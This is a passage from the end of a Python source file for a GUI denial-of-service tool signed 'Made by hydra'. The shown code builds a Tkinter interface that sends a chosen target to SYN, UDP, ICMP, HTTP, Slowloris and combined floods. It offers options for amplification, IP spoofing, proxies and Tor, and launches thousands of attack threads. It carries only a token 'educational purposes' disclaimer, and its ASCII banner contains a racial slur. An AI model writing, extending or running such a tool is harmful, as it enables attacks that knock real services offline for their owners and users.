                bg=BLACK, font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.cores_spinbox = tk.Spinbox(cores_frame, from_=1, to=self.num_cores,
                                       font=('Arial', 10), bg=DARK_GRAY, 
                                       fg=WHITE, width=5,
                                       buttonbackground=PURPLE_DARK)
        self.cores_spinbox.delete(0, tk.END)
        self.cores_spinbox.insert(0, str(self.num_cores))
        self.cores_spinbox.pack(side=tk.LEFT, padx=5)
        
        # THREADS
        self.create_label(mid_frame, "THREADS PER CORE:")
        self.threads_spinbox = tk.Spinbox(mid_frame, from_=1, to=500,
                                         font=('Arial', 10), bg=DARK_GRAY, 
                                         fg=WHITE, width=10,
                                         buttonbackground=PURPLE_DARK)
        self.threads_spinbox.delete(0, tk.END)
        self.threads_spinbox.insert(0, "200")
        self.threads_spinbox.pack(pady=5)
        
        # TOTAL POWER
        self.create_label(mid_frame, "ESTIMATED TOTAL POWER:")
        self.power_total_label = tk.Label(mid_frame, text=f"{self.max_power:,} THREADS",
                                         font=('Arial', 12, 'bold'),
                                         fg=PURPLE_LIGHT, bg=BLACK)
        self.power_total_label.pack(pady=5)
        
        # ADVANCED OPTIONS
        adv_frame = tk.LabelFrame(mid_frame, text="ADVANCED OPTIONS", 
                                  bg=BLACK, fg=PURPLE_LIGHT,
                                  font=('Arial', 11, 'bold'))
        adv_frame.pack(pady=10, padx=10, fill=tk.X)
        
        self.proxy_var = tk.BooleanVar(value=True)
        tk.Checkbutton(adv_frame, text="USE PROXIES (HTTP/SOCKS)", 
                      variable=self.proxy_var,
                      bg=BLACK, fg=PURPLE_LIGHT, 
                      selectcolor=PURPLE_DARK,
                      activebackground=PURPLE_DARK).pack(anchor=tk.W, pady=2)
        
        self.tor_var = tk.BooleanVar(value=True)
        tk.Checkbutton(adv_frame, text="USE TOR (ANONYMITY)", 
                      variable=self.tor_var,
                      bg=BLACK, fg=PURPLE_LIGHT, 
                      selectcolor=PURPLE_DARK,
                      activebackground=PURPLE_DARK).pack(anchor=tk.W, pady=2)
        
        self.amp_var = tk.BooleanVar(value=True)
        tk.Checkbutton(adv_frame, text="AMPLIFICATION (DNS/NTP/MEMCACHED)", 
                      variable=self.amp_var,
                      bg=BLACK, fg=PURPLE_LIGHT, 
                      selectcolor=PURPLE_DARK,
                      activebackground=PURPLE_DARK).pack(anchor=tk.W, pady=2)
        
        self.spoof_var = tk.BooleanVar(value=True)
        tk.Checkbutton(adv_frame, text="IP SPOOFING", 
                      variable=self.spoof_var,
                      bg=BLACK, fg=PURPLE_LIGHT, 
                      selectcolor=PURPLE_DARK,
                      activebackground=PURPLE_DARK).pack(anchor=tk.W, pady=2)
        
        # Right column - Statistics
        right_frame = tk.Frame(controls_container, bg=BLACK, bd=2, relief=tk.SUNKEN)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5)
        
        tk.Label(right_frame, text="📊 REAL-TIME STATISTICS 📊", 
                font=('Arial', 14, 'bold'), fg=PURPLE_LIGHT, bg=BLACK).pack(pady=10)
        
        self.stats_labels = {}
        stats_items = [
            ('STATUS', '🔄'),
            ('RPS (REQUESTS/SEC)', '📊'),
            ('BANDWIDTH (MBPS)', '🌐'),
            ('DATA SENT (MB)', '💾'),
            ('DATA SENT (GB)', '📀'),
            ('PACKETS SENT', '📦'),
            ('REQUESTS', '📨'),
            ('SUCCESS RATE %', '✅'),
            ('ERRORS', '❌'),
            ('ACTIVE THREADS', '⚡'),
            ('POWER LEVEL', '🔥'),
            ('TIME REMAINING (S)', '⏱️')
        ]
        
        for label, icon in stats_items:
            frame = tk.Frame(right_frame, bg=BLACK)
            frame.pack(fill=tk.X, padx=10, pady=2)
            
            tk.Label(frame, text=f"{icon} {label}:", font=('Arial', 9, 'bold'),
                    fg=PURPLE_LIGHT, bg=BLACK, width=20, anchor=tk.W).pack(side=tk.LEFT)
            
            self.stats_labels[label] = tk.Label(frame, text="WAITING", 
                                               font=('Arial', 9),
                                               fg=WHITE, bg=BLACK, anchor=tk.W)
            self.stats_labels[label].pack(side=tk.LEFT, padx=5)
        
        # ===== CONTROL BUTTONS (LARGE AND VISIBLE) =====
        button_frame = tk.Frame(main_frame, bg=PURPLE_DARK)
        button_frame.pack(pady=20)
        
        # START BUTTON (GREEN)
        self.start_btn = tk.Button(button_frame, 
                                   text="🚀 START ATTACK 🚀",
                                   bg=GREEN, 
                                   fg=BLACK,
                                   font=('Arial', 18, 'bold'),
                                   width=20,
                                   height=2,
                                   relief=tk.RAISED,
                                   bd=4,
                                   activebackground=PURPLE_LIGHT,
                                   command=self.start_attack)
        self.start_btn.pack(side=tk.LEFT, padx=10)
        
        # STOP BUTTON (RED)
        self.stop_btn = tk.Button(button_frame,
                                  text="🛑 STOP ATTACK 🛑",
                                  bg=RED,
                                  fg=WHITE,
                                  font=('Arial', 18, 'bold'),
                                  width=20,
                                  height=2,
                                  relief=tk.RAISED,
                                  bd=4,
                                  state=tk.DISABLED,
                                  activebackground=PURPLE_LIGHT,
                                  command=self.stop_attack)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        # LOG
        log_frame = tk.Frame(main_frame, bg=BLACK, bd=2, relief=tk.SUNKEN)
        log_frame.pack(pady=10, padx=20, fill=tk.X)
        
        log_header = tk.Frame(log_frame, bg=BLACK)
        log_header.pack(fill=tk.X, padx=5, pady=2)
        
        tk.Label(log_header, text="📝 ATTACK CONSOLE:", 
                font=('Arial', 10, 'bold'),
                fg=PURPLE_LIGHT, bg=BLACK).pack(side=tk.LEFT)
        
        tk.Label(log_header, text="Made by hydra", 
                font=('Arial', 8, 'italic'),
                fg=PURPLE_LIGHT, bg=BLACK).pack(side=tk.RIGHT, padx=5)
        
        self.log_text = tk.Text(log_frame, height=4, bg=DARK_GRAY,
                                fg=WHITE, font=('Consolas', 9),
                                insertbackground=PURPLE_LIGHT,
                                relief=tk.FLAT)
        self.log_text.pack(fill=tk.X, padx=5, pady=5)
        
        # Status bar
        self.status_label = tk.Label(main_frame, text="✅ READY TO ATTACK - SYSTEM OPTIMIZED | Made by hydra",
                                     bg=PURPLE_DARK, fg=PURPLE_LIGHT, 
                                     font=('Arial', 10, 'bold'))
        self.status_label.pack(pady=5)
    
    def create_label(self, parent, text):
        label = tk.Label(parent, text=text, font=('Arial', 10, 'bold'),
                        fg=PURPLE_LIGHT, bg=BLACK, anchor=tk.W)
        label.pack(pady=(10,0), anchor=tk.W)
    
    def log(self, message):
        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def update_stats(self):
        if self.stats and self.attack_running:
            stats = self.stats.get_power_stats()
            
            self.stats_labels['RPS (REQUESTS/SEC)'].config(text=stats['rps'])
            self.stats_labels['BANDWIDTH (MBPS)'].config(text=stats['bandwidth'])
            self.stats_labels['DATA SENT (MB)'].config(text=stats['data_mb'])
            self.stats_labels['DATA SENT (GB)'].config(text=stats['data_gb'])
            self.stats_labels['PACKETS SENT'].config(text=stats['packets'])
            self.stats_labels['REQUESTS'].config(text=stats['requests'])
            self.stats_labels['SUCCESS RATE %'].config(text=stats['success'])
            self.stats_labels['ERRORS'].config(text=stats['errors'])
            
            if self.config:
                self.stats_labels['ACTIVE THREADS'].config(text=f"{self.config.total_threads:,}")
                self.stats_labels['POWER LEVEL'].config(text=f"{self.config.power_level}% ({self.config.total_power})")
            
            if self.start_time:
                elapsed = time.time() - self.start_time
                remaining = max(0, self.config.duration - elapsed)
                self.stats_labels['TIME REMAINING (S)'].config(text=f"{remaining:.0f}s")
            
            self.root.after(1000, self.update_stats)
    
    def start_attack(self):
        target = self.ip_entry.get().strip()
        if not target:
            messagebox.showerror("ERROR", "Enter an IP, domain or URL!")
            return
        
        try:
            duration = int(self.duration_entry.get())
            if duration <= 0:
                raise ValueError
        except:
            messagebox.showerror("ERROR", "Invalid duration!")
            return
        
        try:
            port = int(self.port_entry.get())
            if port <= 0 or port > 65535:
                raise ValueError
        except:
            port = 80
        
        try:
            cores = int(self.cores_spinbox.get())
            threads_per_core = int(self.threads_spinbox.get())
            power_level = int(self.power_scale.get())
        except:
            cores = self.num_cores
            threads_per_core = 200
            power_level = 100
        
        attack_map = {
            "🔥 APOCALYPSE (ALL VECTORS)": "apocalypse",
            "💀 NUCLEAR (L3 + L7)": "nuclear",
            "🌐 LAYER 3/4 (NETWORK)": "l3",
            "🌍 LAYER 7 (APPLICATION)": "l7",
            "📡 AMPLIFICATION (DNS/NTP/MEMCACHED)": "amplification",
            "⚡ TCP SYN FLOOD": "syn",
            "💧 UDP FLOOD": "udp",
            "🔥 HTTP/HTTPS FLOOD": "http",
            "🐌 SLOWLORIS": "slowloris",
            "💀 ICMP FLOOD (PING)": "icmp"
        }
        
        self.config = PowerConfig(
            target=target,
            port=port,
            duration=duration,
            cores=cores,
            threads_per_core=threads_per_core,
            power_level=power_level,
            method=attack_map.get(self.attack_type.get(), "apocalypse"),
            target_type=self.target_type.get().lower(),
            ipv6=(self.ip_type.get() != "IPv4"),
            ssl=self.ssl_var.get(),
            use_proxies=self.proxy_var.get(),
            use_tor=self.tor_var.get(),
            use_amplification=self.amp_var.get(),
            ip_spoofing=self.spoof_var.get()
        )
        
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.attack_running = True
        self.start_time = time.time()
        
        self.log_text.delete(1.0, tk.END)
        self.attack_thread = threading.Thread(target=self.run_attack)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        self.stats_labels['STATUS'].config(text="🔥 ATTACKING 🔥")
        self.log(f"🔥 ATTACK STARTED AGAINST {target}:{port}")
        self.log(f"⚡ METHOD: {self.attack_type.get()}")
        self.log(f"💪 THREADS: {self.config.total_threads:,}")
        self.log(f"📊 POWER: {self.config.total_power} ({power_level}%) | Made by hydra")
        
        self.status_label.config(text="🔥 ATTACKING - APOCALYPSE MODE ACTIVATED 🔥 | Made by hydra", fg=RED)
        
        self.update_stats()
    
    def run_attack(self):
        try:
            self.stats = PowerStatistics()
            attackers = []
            
            if self.config.method in ['apocalypse', 'nuclear', 'l3', 'syn', 'udp', 'icmp', 'amplification']:
                l3 = NuclearL3Attack(self.config, self.stats, self.log)
                attackers.append(l3)
                
                thread_pool = []
                threads_per_core_l3 = self.config.threads_per_core // 2
                
                for core in range(self.config.cores):
                    for i in range(threads_per_core_l3):
                        if self.config.method in ['apocalypse', 'nuclear', 'udp']:
                            t = threading.Thread(target=l3.udp_mega_flood, args=(core*1000+i,))
                            thread_pool.append(t)
                        
                        if self.config.method in ['apocalypse', 'nuclear', 'syn'] and SCAPY_AVAILABLE:
                            t = threading.Thread(target=l3.syn_nuclear_flood, args=(core*1000+i,))
                            thread_pool.append(t)
                        
                        if self.config.method in ['apocalypse', 'nuclear', 'icmp'] and SCAPY_AVAILABLE:
                            t = threading.Thread(target=l3.icmp_apocalypse, args=(core*1000+i,))
                            thread_pool.append(t)
                
                for t in thread_pool:
                    t.daemon = True
                    t.start()
                
                self.log(f"✅ {len(thread_pool)} L3 threads started")
            
            if self.config.method in ['apocalypse', 'nuclear', 'l7', 'http', 'slowloris']:
                l7 = NuclearL7Attack(self.config, self.stats, self.log)
                attackers.append(l7)
                
                for core in range(self.config.cores):
                    t = threading.Thread(target=l7.run)
                    t.daemon = True
                    t.start()
                
                self.log(f"✅ {self.config.cores} L7 processes started")
            
            time.sleep(self.config.duration)
            
            self.attack_running = False
            for attacker in attackers:
                attacker.stop()
            
            stats = self.stats.get_power_stats()
            self.log(f"✅ ATTACK FINISHED! Made by hydra")
            self.log(f"📊 TOTAL: {stats['data_gb']}GB | {stats['rps']} RPS | {stats['packets']} PACKETS")
            
        except Exception as e:
            self.log(f"❌ ERROR: {e}")
        finally:
            self.root.after(0, self.attack_finished)
    
    def attack_finished(self):
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.attack_running = False
        self.stats_labels['STATUS'].config(text="✅ FINISHED")
        self.status_label.config(text="✅ ATTACK FINISHED - SYSTEM READY | Made by hydra", fg=GREEN)
    
    def stop_attack(self):
        self.attack_running = False
        self.log("🛑 STOPPING ATTACK... | Made by hydra")
        self.stop_btn.config(state=tk.DISABLED)
        self.status_label.config(text="🛑 STOPPING ATTACK... | Made by hydra", fg=RED)
    
    def on_closing(self):
        if self.attack_running:
            if messagebox.askyesno("CONFIRM", "Attack in progress! Do you really want to exit?"):
                self.stop_attack()
                time.sleep(2)
                self.root.destroy()
        else:
            self.root.destroy()

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║    ██████╗ ██████╗  ██████╗ ███████╗    ███╗   ██╗██╗ ██████╗  ██████╗  █████╗ 
    ║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ████╗  ██║██║██╔════╝ ██╔════╝ ██╔══██╗
    ║    ██║  ██║██████╔╝██║   ██║███████╗    ██╔██╗ ██║██║██║  ███╗██║  ███╗███████║
    ║    ██║  ██║██╔══██╗██║   ██║╚════██║    ██║╚██╗██║██║██║   ██║██║   ██║██╔══██║
    ║    ██████╔╝██████╔╝╚██████╔╝███████║    ██║ ╚████║██║╚██████╔╝╚██████╔╝██║  ██║
    ║    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═══╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    ║                                                                   ║
    ║                       ULTIMATE POWER EDITION                      ║
    ║                   2PAC - ALL EYEZ ON ME                          ║
    ║                         PURPLE EDITION                           ║
    ║                         Made by hydra                            ║
    ║                                                                   ║
    ║              POWER LEVEL: ████████████████████ 100%              ║
    ║              MAX THREADS: 10,000+                                ║
    ║              BANDWIDTH:   UNLIMITED                              ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    print("\n[!] LEGAL WARNING:")
    print("    This tool is for EDUCATIONAL PURPOSES and AUTHORIZED TESTING only.")
    print("    Unauthorized use against systems you don't own is ILLEGAL.")
    print("    The author assumes NO LIABILITY for misuse.\n")
    
    print(f"⚡ DETECTING SYSTEM POWER...")
    print(f"   Cores: {multiprocessing.cpu_count()}")
    if PSUTIL_AVAILABLE:
        print(f"   RAM: {psutil.virtual_memory().total / 1024**3:.1f} GB")
    print(f"   Scapy: {'✅' if SCAPY_AVAILABLE else '❌'} (for L3)")
    print(f"   PIL: {'✅' if PIL_AVAILABLE else '❌'} (for images)")
    print()
    
    try:
        optimize_system_power()
        print("✅ System optimizations applied")
    except:
        pass
    
    missing = []
    try:
        import aiohttp
    except:
        missing.append('aiohttp')
    try:
        import aiohttp_socks
    except:
        missing.append('aiohttp-socks')
    
    if missing:
        print(f"❌ Install: pip install {' '.join(missing)}")
        input("\nPress Enter to continue...")
    
    try:
        root = tk.Tk()
        app = DDoSApp(root)
        root.mainloop()
    except Exception as e:
        print(f"❌ ERROR: {e}")
        import traceback
        traceback.print_exc()
        input("\nPress Enter to exit...")
